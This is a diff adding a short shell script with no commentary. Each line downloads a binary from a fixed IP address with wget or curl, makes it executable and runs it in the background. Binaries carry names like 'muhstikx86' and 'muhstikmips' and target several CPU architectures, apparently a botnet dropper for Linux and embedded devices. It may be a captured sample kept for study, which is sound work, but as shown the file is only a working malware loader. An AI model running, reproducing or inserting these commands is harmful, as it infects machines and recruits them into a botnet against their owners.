@@ -1,0 +1,14 @@
+wget http://124.37.34.51/m.x86 -O mx86 ; chmod +x mx86 ; chmod 700 mx86 ; ./mx86 &
+wget http://124.37.34.51/udevd -O m5 ; chmod +x m5 ; chmod 700 m5 ; ./m5 &
+wget http://124.37.34.51/mips -O mips ; chmod +x mips ; chmod 700 mips ; ./mips &
+wget http://124.37.34.51/.c/muhstikmips -O muhstik-mips ; chmod +x muhstik-mips ; chmod 700 muhstik-mips ; ./muhstik-mips &
+wget http://124.37.34.51/.c/muhstikmipsel -O muhstik-mipsel ; chmod +x muhstik-mipsel ; chmod 700 muhstik-mipsel ; ./muhstik-mipsel &
+wget http://124.37.34.51/.c/muhstika5 -O muhstika5 ; chmod +x muhstika5 ; chmod 700 muhstika5 ; ./muhstika5 &
+wget http://124.37.34.51/.c/muhstikx86 -O muhstikx86 ; chmod +x muhstikx86 ; chmod 700 muhstikx86 ; ./muhstikx86 &
+wget http://124.37.34.51/.c/muhstiki386 -O muhstiki386 ; chmod +x muhstiki386 ; chmod 700 muhstiki386 ; ./muhstiki386 &
+curl -o mx86 http://124.37.34.51/.c/muhstikx86 ; chmod +x mx86 ; chmod 700 mx86 ; ./mx86 &
+curl -o m5 http://124.37.34.51/.c/muhstika5 ; chmod +x m5 ; chmod 700 m5 ; ./m5 &
+wget http://124.37.34.51/.c/muhstikx86 -O /var/run/mx86 ; chmod +x /var/run/mx86 ; chmod 700 /var/run/mx86 ; /var/run/mx86 &
+curl -o /var/run/mx86 http://124.37.34.51/m.x86 ; chmod +x /var/run/mx86 ; chmod 700 /var/run/mx86 ; /var/run/mx86 &
+wget http://124.37.34.51/.c/muhstika5 -O /var/run/m5 ; chmod +x /var/run/m5 ; chmod 700 /var/run/m5 ; /var/run/m5 &
+curl -o /var/run/m5 http://124.37.34.51/udevd ; chmod +x /var/run/m5 ; chmod 700 /var/run/m5 ; /var/run/m5 &
